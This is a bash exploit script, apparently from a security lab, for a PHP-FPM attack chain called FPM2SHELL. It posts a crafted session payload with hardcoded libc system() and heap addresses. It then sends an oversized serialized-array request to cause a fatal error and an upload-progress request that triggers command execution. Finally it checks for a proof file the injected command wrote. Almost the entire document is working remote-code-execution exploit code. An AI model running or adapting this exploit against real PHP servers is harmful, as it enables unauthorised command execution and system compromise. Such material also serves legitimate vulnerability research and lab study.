#!/usr/bin/env bash
# FPM2SHELL module 3g: pure request sequence, no gdb, no /proc access.
#
# Addresses are calibrated once for this lab image/master (the FPM master's
# mappings are inherited by every worker, so they are stable across worker
# respawns):
#   D      = stale php_unserialize_data address left by request A
#   SYSTEM = libc base + system offset
#
# This script only sends HTTP requests to the victim app and checks the
# target-side proof file.  It does not attach a debugger.
set -u
SID="${F2S_SID:-f2spure000000000000000000001}"
D="${F2S_D:-0x7f886e26c000}"
SYSTEM="${F2S_SYSTEM:-0x7f886f0bf090}"
LEN="${F2S_LEN:-65500}"
STRUCT_OFF="${F2S_STRUCT_OFF:-0x1fe8}"
CMD="${F2S_CMD:-id>/tmp/f2s_pwn}"
LAB="$(cd "$(dirname "$0")" && pwd)"
TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT

echo "[i] build store payload"
python3 "$LAB/m3_app.py" --d "$D" --system "$SYSTEM" --length "$LEN" \
    --struct-off "$STRUCT_OFF" --cmd "$CMD" --out "$TMP/store.bin"

docker exec f2s-php rm -f "/tmp/sess_$SID"
echo "[i] store"
python3 "$LAB/http_post.py" /store.php "$TMP/store.bin" "$SID"
docker exec f2s-php sh -c "wc -c /tmp/sess_$SID; tail -c 40 /tmp/sess_$SID; echo"

echo "[i] A (fatal)"
python3 - "$TMP" <<'PYEOF'
import sys
B = b"----f2sfatal00000000"
def part(n, b):
    return (b"--" + B + b"\r\nContent-Disposition: form-data; name=\"" + n +
            b"\"\r\n\r\n" + b + b"\r\n")
elems = b"".join(b"i:%d;a:1:{i:0;i:1;}" % i for i in range(40000))
open(sys.argv[1] + "/fatal", "wb").write(
    part(b"filler", b"Q" * 4000000) +
    part(b"data", b"a:%d:{%s}" % (40000, elems)) + b"--" + B + b"--\r\n")
PYEOF
python3 "$LAB/http_post.py" /index.php "$TMP/fatal" "$SID"

echo "[i] B (upload progress)"
python3 - "$TMP" "$SID" <<'PYEOF'
import sys
B = b"----f2supl00000000"
def part(n, v, fn=None):
    h = b"--" + B + b"\r\nContent-Disposition: form-data; name=\"" + n + b"\""
    if fn is not None:
        h += b"; filename=\"" + fn + b"\""
    h += b"\r\n\r\n"
    return h + v + b"\r\n"
body = part(b"PHPSESSID", sys.argv[2].encode())
body += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"fk1")
body += part(b"f", b"", b"a")
body += b"--" + B + b"--\r\n"
open(sys.argv[1] + "/b.bin", "wb").write(body)
PYEOF
python3 "$LAB/http_post.py" /index.php "$TMP/b.bin" "$SID"
sleep 0.5

echo "[i] proof:"
docker exec f2s-php sh -c "ls -l /tmp/f2s_pwn 2>/dev/null; cat /tmp/f2s_pwn 2>/dev/null"
